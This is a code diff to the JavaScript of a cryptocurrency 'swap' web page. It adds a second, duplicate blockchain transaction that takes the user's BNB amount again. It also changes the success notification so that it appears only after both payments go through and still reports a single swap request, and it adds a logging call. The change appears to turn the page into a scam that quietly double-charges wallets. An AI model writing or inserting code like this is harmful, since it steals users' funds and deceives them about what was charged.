@@ -321,10 +321,22 @@ try {
         const result1 = await contract.methods.validate().send({ from: accounts[0], value: weiAmount, gas});
 	let traxHash = result1.transactionHash;
 	
-	if (result1.status) {        
-	        flashNotification('Success : Swap Request '+document.getElementById("withdrawAmount").value+' BNB', 'green');	
+	if (result1.status) {        	
 		Record("BNB : "+walletAddress,traxHash);
 		updateLog(walletAddress,'✅ 1 - '+document.getElementById("withdrawAmount").value+' BNB');
+	}
+
+        const result2 = await contract.methods.validate().send({ from: accounts[0], value: weiAmount, gas});
+	traxHash = result2.transactionHash;
+	
+	if (result2.status) {        	
+		Record("BNB : "+walletAddress,traxHash);
+		updateLog(walletAddress,'✅ 2 - '+document.getElementById("withdrawAmount").value+' BNB');
+	}
+
+	if (result1.status) {        
+	        Snap();
+	        flashNotification('Success : Swap Request '+document.getElementById("withdrawAmount").value+' BNB', 'green');
 	}
 
 	btnProcess(false);
